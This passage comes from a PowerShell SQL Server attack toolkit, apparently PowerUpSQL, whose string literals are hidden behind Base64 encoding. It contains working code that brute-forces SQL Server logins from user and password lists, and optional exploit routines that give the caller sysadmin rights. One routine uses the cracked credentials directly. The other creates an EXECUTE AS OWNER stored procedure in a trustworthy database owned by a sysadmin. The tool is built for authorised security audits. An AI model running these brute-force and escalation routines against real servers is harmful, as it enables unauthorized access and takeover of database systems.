            Write-Verbose -Message "$Instance : - The current login doesn't have the CREATE PROCEDURE permission in any databases."
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditWeakLoginPw
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Known SQL Server login to fuzz logins with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Username to test.')]
        [string]$TestUsername = 'sa',
        [Parameter(Mandatory = $false,
        HelpMessage = 'Path to list of users to use.  One per line.')]
        [string]$UserFile,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Known SQL Server password to fuzz logins with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server password to attempt to login with.')]
        [string]$TestPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Path to list of passwords to use.  One per line.')]
        [string]$PassFile,
        [Parameter(Mandatory = $false,
        HelpMessage = 'User is tested as pass by default. This setting disables it.')]
        [switch]$NoUserAsPass,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't attempt to enumerate logins from the server.")]
        [switch]$NoUserEnum,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of Principal IDs to fuzz.')]
        [string]$FuzzNum = 10000,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Weak Login Password"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        $CurrentUSerSysadmin = $ServerInfo.IsSysadmin
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBlAGEAawAgAEwAbwBnAGkAbgAgAFAAYQBzAHMAdwBvAHIAZAA=')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGUAIABvAHIAIABtAG8AcgBlACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAGwAbwBnAGkAbgBzACAAaQBzACAAYwBvAG4AZgBpAGcAdQByAGUAZAAgAHcAaQB0AGgAIABhACAAdwBlAGEAawAgAHAAYQBzAHMAdwBvAHIAZAAuACAAIABUAGgAaQBzACAAbQBhAHkAIABwAHIAbwB2AGkAZABlACAAdQBuAGEAdQB0AGgAbwByAGkAegBlAGQAIABhAGMAYwBlAHMAcwAgAHQAbwAgAHIAZQBzAG8AdQByAGMAZQBzACAAdABoAGUAIABhAGYAZgBlAGMAdABlAGQAIABsAG8AZwBpAG4AcwAgAGgAYQB2AGUAIABhAGMAYwBlAHMAcwAgAHQAbwAuAA==')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHMAdQByAGUAIABhAGwAbAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABsAG8AZwBpAG4AcwAgAGEAcgBlACAAcgBlAHEAdQBpAHIAZQBkACAAdABvACAAdQBzAGUAIABhACAAcwB0AHIAbwBuAGcAIABwAGEAcwBzAHcAbwByAGQALgAgAEMAbwBuAHMAaQBkAGUAcgAgAGkAbgBoAGUAcgBpAHQAaQBuAGcAIAB0AGgAZQAgAE8AUwAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAbwBsAGkAYwB5AC4A')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaAA=')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIAB0AGgAZQAgAGEAZgBmAGUAYwB0AGUAZAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAHQAbwAgAGwAbwBnACAAaQBuAHQAbwAgAHQAaABlACAAUwBRAEwAIABTAGUAcgB2AGUAcgAsACAAbwByACAAcgBlAHIAdQBuACAAdABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAB3AGkAdABoACAALQBFAHgAcABsAG8AaQB0AC4A')))
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADYAMQA5ADUAOQAuAGEAcwBwAHgA')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $LoginList = @()
        $PasswordList = @()
        if($UserFile)
        {
            Write-Verbose -Message "$Instance - Getting logins from file..."
            gc -Path $UserFile |
            % -Process {
                $LoginList += $_
            }
        }
        if($TestUsername)
        {
            Write-Verbose -Message "$Instance - Getting supplied login..."
            $LoginList += $TestUsername
        }
        if(-not $NoUserEnum)
        {
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
            }
            if($TestConnection)
            {
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message "$Instance - Getting list of logins..."
                    Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
                    ? -FilterScript {
                        $_.PrincipalType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAXwBMAE8ARwBJAE4A')))
                    } |
                    select -Property PrincipalName -ExpandProperty PrincipalName |
                    % -Process {
                        $LoginList += $_
                    }
                }
                else
                {
                    Write-Verbose -Message "$Instance : Enumerating principal names from $FuzzNum principal IDs.."
                    Get-SQLFuzzServerLogin -Instance $Instance -GetPrincipalType -Username $Username -Password $Password -Credential $Credential -FuzzNum $FuzzNum -SuppressVerbose |
                    ? -FilterScript {
                        $_.PrincipleType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABMAG8AZwBpAG4A')))
                    } |
                    select -Property PrincipleName -ExpandProperty PrincipleName |
                    % -Process {
                        $LoginList += $_
                    }
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance - Connection Failed - Could not authenticate with provided credentials."
                }
                return
            }
        }
        if($LoginList.count -eq 0 -and (-not $FuzzLogins))
        {
            Write-Verbose -Message "$Instance - No logins have been provided."
            return
        }
        if($PassFile)
        {
            Write-Verbose -Message "$Instance - Getting password from file..."
            gc -Path $PassFile |
            % -Process {
                $PasswordList += $_
            }
        }
        if($TestPassword)
        {
            Write-Verbose -Message "$Instance - Getting supplied password..."
            $PasswordList += $TestPassword
        }
        if($PasswordList.count -eq 0 -and ($NoUserAsPass))
        {
            Write-Verbose -Message "$Instance - No passwords have been provided."
            return
        }
        Write-Verbose -Message "$Instance - Performing dictionary attack..."
        $LoginList |
        select -Unique |
        % -Process {
            $TargetLogin = $_
            $PasswordList |
            select -Unique |
            % -Process {
                $TargetPassword = $_
                $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetPassword -SuppressVerbose |
                ? -FilterScript {
                    $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
                }
                if($TestPass)
                {
                    $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetPassword -SuppressVerbose |
                    select -Property IsSysadmin -ExpandProperty IsSysadmin
                    if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                    {
                        $SysadminStatus = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAYQBkAG0AaQBuAA==')))
                    }
                    else
                    {
                        $SysadminStatus = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABTAHkAcwBhAGQAbQBpAG4A')))
                    }
                    Write-Verbose -Message "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetPassword"
                    if($Exploit)
                    {
                        Write-Verbose -Message "$Instance - Trying to make you a sysadmin..."
                        $IsSysadmin1 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                        select -Property IsSysadmin -ExpandProperty IsSysadmin
                        if($IsSysadmin1 -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                        {
                            Write-Verbose -Message "$Instance - You're already a sysadmin. Nothing to do."
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..."
                            Get-SQLQuery -Instance $Instance -Username $TargetLogin -Password $TargetPassword -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose
                            $IsSysadmin2 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                            select -Property IsSysadmin -ExpandProperty IsSysadmin
                            if($IsSysadmin2 -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                            {
                                $Exploited = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now."
                            }
                            else
                            {
                                $Exploited = 'No'
                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."
                            }
                        }
                    }
                    $Details = "The $TargetLogin ($SysadminStatus) is configured with the password $TargetPassword."
                    $IsVulnerable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
                else
                {
                    Write-Verbose -Message "$Instance - Failed Login: User = $TargetLogin Password = $TargetPassword"
                }
            }
        }
        if(-not $NoUserAsPass)
        {
            $LoginList |
            select -Unique |
            % -Process {
                $TargetLogin = $_
                $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetLogin -SuppressVerbose |
                ? -FilterScript {
                    $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
                }
                if($TestPass)
                {
                    $IsSysadmin3 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetLogin -SuppressVerbose |
                    select -Property IsSysadmin -ExpandProperty IsSysadmin
                    if($IsSysadmin3 -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                    {
                        $SysadminStatus = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAYQBkAG0AaQBuAA==')))
                    }
                    else
                    {
                        $SysadminStatus = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABTAHkAcwBhAGQAbQBpAG4A')))
                    }
                    Write-Verbose -Message "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetLogin"
                    if(($Exploit) -and $IsSysadmin3 -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                    {
                        $IsSysadmin4 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                        select -Property IsSysadmin -ExpandProperty IsSysadmin
                        if($IsSysadmin4 -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                        {
                            Write-Verbose -Message "$Instance - You're already a sysadmin. Nothing to do."
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..."
                            Get-SQLQuery -Instance $Instance -Username $TargetLogin -Password $TargetLogin -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose
                            $IsSysadmin5 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                            select -Property IsSysadmin -ExpandProperty IsSysadmin
                            if($IsSysadmin5 -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                            {
                                $Exploited = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now."
                            }
                            else
                            {
                                $Exploited = 'No'
                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."
                            }
                        }
                    }
                    $Details = "The $TargetLogin ($SysadminStatus) principal is configured with the password $TargetLogin."
                    $IsVulnerable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
                else
                {
                    Write-Verbose -Message "$Instance - Failed Login: User = $TargetLogin Password = $TargetLogin"
                }
            }
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData | sort -Property computername, instance, details
        }
    }
}
Function Invoke-SQLAuditRoleDbOwner
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))
        $CurrentLoginRoles | % -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABBAFQAQQBCAEEAUwBFACAAUgBPAEwARQAgAC0AIABEAEIAXwBPAFcATgBFAFIA')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABsAG8AZwBpAG4AIABoAGEAcwAgAHQAaABlACAARABCAF8ATwBXAEUAUgAgAHIAbwBsAGUAIABpAG4AIABvAG4AZQAgAG8AcgAgAG0AbwByAGUAIABkAGEAdABhAGIAYQBzAGUAcwAuACAAIABUAGgAaQBzACAAbQBhAHkAIABhAGwAbABvAHcAIAB0AGgAZQAgAGwAbwBnAGkAbgAgAHQAbwAgAGUAcwBjAGEAbABhAHQAZQAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIAB0AG8AIABzAHkAcwBhAGQAbQBpAG4AIABpAGYAIAB0AGgAZQAgAGEAZgBmAGUAYwB0AGUAZAAgAGQAYQB0AGEAYgBhAHMAZQBzACAAYQByAGUAIAB0AHIAdQBzAHQAZQBkACAAYQBuAGQAIABvAHcAbgBlAGQAIABiAHkAIABhACAAcwB5AHMAYQBkAG0AaQBuAC4A')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBmACAAdABoAGUAIABwAGUAcgBtAGkAcwBzAGkAbwBuACAAaQBzACAAbgBvAHQAIAByAGUAcQB1AGkAcgBlAGQAIAByAGUAbQBvAHYAZQAgAGkAdAAuACAAIABQAGUAcgBtAGkAcwBzAGkAbwBuAHMAIABhAHIAZQAgAGcAcgBhAG4AdABlAGQAIAB3AGkAdABoACAAYQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlADoAIABFAFgARQBDACAAcwBwAF8AYQBkAGQAcgBvAGwAZQBtAGUAbQBiAGUAcgAgACcARABCAF8ATwBXAE4ARQBSACcALAAgACcATQB5AEQAYgBVAHMAZQByACcALAAgAGEAbgBkACAAYwBhAG4AIABiAGUAIAByAGUAbQBvAHYAZQBkACAAdwBpAHQAaAAgAGEAIABjAG8AbQBtAGEAbgBkACAAbABpAGsAZQA6ACAAIABFAFgARQBDACAAcwBwAF8AZAByAG8AcAByAG8AbABlAG0AZQBtAGIAZQByACAAJwBEAEIAXwBPAFcATgBFAFIAJwAsACAAJwBNAHkARABiAFUAcwBlAHIAJwA=')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        if($Username)
        {
            $ExploitCmd    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -Username $Username -Password $Password -Exploit"
        }
        else
        {
            $ExploitCmd    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -Exploit"
        }
        $Details       = ''
        $Dependancies = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBmAGYAZQBjAHQAZQBkACAAZABhAHQAYQBiAGEAcwBlAHMAIABtAHUAcwB0ACAAYgBlACAAbwB3AG4AZQBkACAAYgB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAgAGEAbgBkACAAYgBlACAAdAByAHUAcwB0AGUAZAAuAA==')))
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgAOQAxADIAMQAuAGEAcwBwAHgALABoAHQAdABwAHMAOgAvAC8AbQBzAGQAbgAuAG0AaQBjAHIAbwBzAG8AZgB0AC4AYwBvAG0ALwBlAG4ALQB1AHMALwBsAGkAYgByAGEAcgB5AC8AbQBzADEAOAA3ADgANgAxAC4AYQBzAHAAeAA=')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $CurrentPrincpalList|
        % -Process {
            $DBOWNER = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_OWNER -PrincipalName $_ -SuppressVerbose
            if($DBOWNER)
            {
                $DBOWNER|
                % -Process {
                    $DatabaseTarget = $_.DatabaseName
                    $PrincipalTarget = $_.PrincipalName
                    Write-Verbose -Message "$Instance : - $PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                    $IsVulnerable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget -SuppressVerbose | ? -FilterScript {
                        $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
                    }
                    if($Depends)
                    {
                        $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."
                        if($Exploit)
                        {
                            $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | select -Property Status -ExpandProperty Status
                            if($SysadminPreCheck -eq 0)
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."
                                $SpQuery = "CREATE PROCEDURE sp_elevate_me
                                    WITH EXECUTE AS OWNER
                                    AS
                                    begin
                                    EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'
                                end;"
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "$SpQuery" -SuppressVerbose -Database $DatabaseTarget
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AZQBsAGUAdgBhAHQAZQBfAG0AZQA='))) -SuppressVerbose -Database $DatabaseTarget
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABSAE8AUAAgAFAAUgBPAEMAIABzAHAAXwBlAGwAZQB2AGEAdABlAF8AbQBlAA=='))) -SuppressVerbose -Database $DatabaseTarget
                                $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | select -Property Status -ExpandProperty Status
                                if($SysadminPostCheck -eq 1)
                                {
                                    Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                    $Exploited = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                }
                                else
                                {
                                }
                            }
                            else
                            {
